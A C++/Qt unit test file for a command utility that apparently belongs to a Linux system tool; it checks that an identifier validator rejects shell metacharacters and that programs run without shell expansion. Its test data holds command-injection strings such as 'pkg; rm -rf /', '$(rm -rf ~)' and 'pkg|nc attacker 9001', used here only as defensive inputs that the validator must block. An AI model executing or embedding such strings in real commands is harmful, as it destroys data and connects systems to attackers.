#include "../gt-stacer-core/Utils/command_util.h"
#include <QCoreApplication>
#include <QDebug>
#include <QFile>
#include <QTemporaryFile>
#include <QDir>

static int passed = 0;
static int failed = 0;

#define CHECK(expr, msg) do { \
    if (expr) { qInfo() << "  PASS:" << msg; ++passed; } \
    else      { qWarning() << "  FAIL:" << msg; ++failed; } \
} while (0)

static void testSafeIdentifier()
{
    qInfo() << "\n[isSafeIdentifier]";
    // Allowed: typical package/service names
    CHECK( CommandUtil::isSafeIdentifier("apache2"),                "alnum name");
    CHECK( CommandUtil::isSafeIdentifier("python3.11"),             "dot in name");
    CHECK( CommandUtil::isSafeIdentifier("lib-foo_v2"),             "dash and underscore");
    CHECK( CommandUtil::isSafeIdentifier("user@host"),              "@ allowed");
    CHECK( CommandUtil::isSafeIdentifier("path/to/exec"),           "slash allowed");
    CHECK( CommandUtil::isSafeIdentifier("plus+package"),           "plus allowed");

    // Rejected: shell metacharacters
    CHECK(!CommandUtil::isSafeIdentifier(""),                       "empty rejected");
    CHECK(!CommandUtil::isSafeIdentifier("pkg; rm -rf /"),          "semicolon rejected");
    CHECK(!CommandUtil::isSafeIdentifier("pkg && evil"),            "&& rejected");
    CHECK(!CommandUtil::isSafeIdentifier("pkg|cat"),                "pipe rejected");
    CHECK(!CommandUtil::isSafeIdentifier("pkg`whoami`"),            "backtick rejected");
    CHECK(!CommandUtil::isSafeIdentifier("pkg$(echo)"),             "command sub rejected");
    CHECK(!CommandUtil::isSafeIdentifier("pkg > /etc/passwd"),      "redirect rejected");
    CHECK(!CommandUtil::isSafeIdentifier("pkg\nrm"),                "newline rejected");
    CHECK(!CommandUtil::isSafeIdentifier("pkg with space"),         "space rejected");
    CHECK(!CommandUtil::isSafeIdentifier("'quoted'"),               "quote rejected");
    CHECK(!CommandUtil::isSafeIdentifier(QString(257, 'x')),        "too long rejected");
}

static void testExecProgram()
{
    qInfo() << "\n[execProgram] no-shell invocation";
    // /bin/true should succeed
    CHECK(CommandUtil::execProgram("/bin/true", {}, 5000) == 0,    "/bin/true returns 0");
    CHECK(CommandUtil::execProgram("/bin/false", {}, 5000) != 0,   "/bin/false returns non-zero");

    // Output capture: echo via /bin/echo so args are not shell-interpreted
    QString out = CommandUtil::execProgramOutput("/bin/echo", {"hello; rm -rf /tmp/*"}, 5000);
    CHECK(out == "hello; rm -rf /tmp/*", "echo passes shell-metachar arg verbatim — no shell expansion");
}

static void testPkexecWriteFilePathValidation()
{
    qInfo() << "\n[pkexecWriteFile] path/arg validation (does not actually invoke pkexec)";
    // Empty destination is rejected before any pkexec call.
    CHECK(!CommandUtil::pkexecWriteFile("",         "x", "root", "root", "0644"), "empty destPath rejected");
    CHECK(!CommandUtil::pkexecWriteFile("\nbad",  "x", "root", "root", "0644"),   "newline in destPath rejected");
    // We do not test the actual root-write here (would require interactive pkexec).
}

static void testInjectionRejectionInTools()
{
    qInfo() << "\n[Tools] dangerous names should be rejected without invoking pkexec";
    // PackageTool::remove with a malicious name — we can't link the full tool from a
    // standalone test without pulling all of core, so we rely on isSafeIdentifier
    // which is the gate the tools call before constructing argv.
    QStringList malicious = {
        "evil; reboot",
        "$(rm -rf ~)",
        "pkg`id`",
        "pkg|nc attacker 9001",
        "pkg && wget evil",
    };
    for (const auto &m : malicious)
        CHECK(!CommandUtil::isSafeIdentifier(m), QString("blocked: %1").arg(m).toUtf8().constData());
}

int main(int argc, char *argv[])
{
    QCoreApplication app(argc, argv);

    testSafeIdentifier();
    testExecProgram();
    testPkexecWriteFilePathValidation();
    testInjectionRejectionInTools();

    qInfo().noquote() << QString("\n────── %1 passed · %2 failed ──────")
                            .arg(passed).arg(failed);
    return failed == 0 ? 0 : 1;
}
